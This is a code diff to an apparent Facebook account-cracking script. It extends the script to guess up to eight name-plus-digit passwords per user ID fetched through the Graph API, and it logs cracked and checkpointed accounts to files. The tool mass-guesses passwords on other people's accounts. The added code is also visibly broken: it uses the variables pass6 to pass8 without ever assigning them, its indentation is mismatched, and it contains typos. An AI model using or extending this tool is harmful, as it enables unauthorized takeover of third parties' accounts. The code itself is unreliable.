@@ -263,8 +263,8 @@ def menu():
     print 47 * '-'
     print ' \x1b[1;93m Active token: \x1b[1;91m' + tok
     print ' ------------------------------------------ '
-    print '\x1b[1;92m[1] Crack with Name password'
-    print '\x1b[1;92m[2] Crack with Number password'
+    print '\x1b[1;92m[1] Crack with 8 Name password'
+    print '\x1b[1;92m[2] Crack with 5 Number password'
     print '\x1b[1;92m[3] File Extract'
     print '\x1b[1;92m[4] View token'
     print '\x1b[1;92m[5] Logout'
@@ -356,6 +356,9 @@ def a_s():
         p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
         p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
 	p5 = raw_input(' \x1b[1;92m[5]Name + digit: ')
+	p6 = raw_input(' \x1b[1;92m[6]Name + digit: ')
+	p7 = raw_input(' \x1b[1;92m[7]Name + digit: ')
+	p8 = raw_input(' \x1b[1;92m[8]Name + digit: ')
         idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
@@ -390,6 +393,9 @@ def a_s():
         p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
         p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
 	p5 = raw_input(' \x1b[1;92m[5]Name + digit: ')
+	p6 = raw_input(' \x1b[1;92m[]Name + digit: ')
+	p7 = raw_input(' \x1b[1;92m[7]Name + digit: ')
+	p8 = raw_input(' \x1b[1;92m[8]Name + digit: ')
         idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
@@ -424,6 +430,9 @@ def a_s():
         p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
         p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
 	p5 = raw_input(' \x1b[1;92m[5]Name + digit: ')
+	p6 = raw_input(' \x1b[1;92m[6]Name + digit: ')
+	p7 = raw_input(' \x1b[1;92m[7]Name + digit: ')
+	p8 = raw_input(' \x1b[1;92m[8]Name + digit: ')
         try:
             idlist = raw_input('[+] File Name: ')
             for line in open(idlist, 'r').readlines():
@@ -531,6 +540,57 @@ def a_s():
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
                                 cps.apppend(uid + pass5)
+			    
+			    else:
+                                pass5 = name.lower() + p6
+                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
+                                q = json.loads(data)
+                                if 'loc' in q:
+                                    print '\x1b[1;92m[SOHAIL-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                                    ok.write(uid + ' | ' + pass6 + '\n')
+                                    ok.close()
+                                    oks.append(uid + pass6)
+                               elif 'www.facebook.com' in q['error']:
+                                    print '\x1b[1;31;1m[SOHAIL-CP] ' + uid + ' | ' + pass6
+                                    cp = open('HOP_CP.txt', 'a')
+                                    cp.write(uid + ' | ' + pass6 + '\n')
+                                    cp.close()
+                                    cps.apppend(uid + pass6)
+			       
+			       else:
+                                   pass5 = name.lower() + p7       
+                                   data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
+                                   q = json.loads(data)
+                                   if 'loc' in q:
+                                       print '\x1b[1;92m[SOHAIL-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                       ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                                       ok.write(uid + ' | ' + pass7 + '\n')
+                                       ok.close()
+                                       oks.append(uid + pass7)
+                                   elif 'www.facebook.com' in q['error']:
+                                       print '\x1b[1;31;1m[SOHAIL-CP] ' + uid + ' | ' + pass7
+                                       cp = open('HOP_CP.txt', 'a')
+                                       cp.write(uid + ' | ' + pass7 + '\n')
+                                       cp.close()
+                                       cps.apppend(uid + pass7)
+				    
+				   else:
+                                       pass5 = name.lower() + p8      
+                                       data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
+                                       q = json.loads(data)
+                                       if 'loc' in q:
+                                           print '\x1b[1;92m[SOHAIL-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
+                                           ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                                           ok.write(uid + ' | ' + pass8 + '\n')
+                                           ok.close()
+                                           oks.append(uid + pass8)
+                                       elif 'www.facebook.com' in q['error']:
+                                           print '\x1b[1;31;1m[SOHAIL-CP] ' + uid + ' | ' + pass8
+                                           cp = open('HOP_CP.txt', 'a')
+                                           cp.write(uid + ' | ' + pass8 + '\n')
+                                           cp.close()
+                                           cps.apppend(uid + pass8)
 						
         except:
             pass
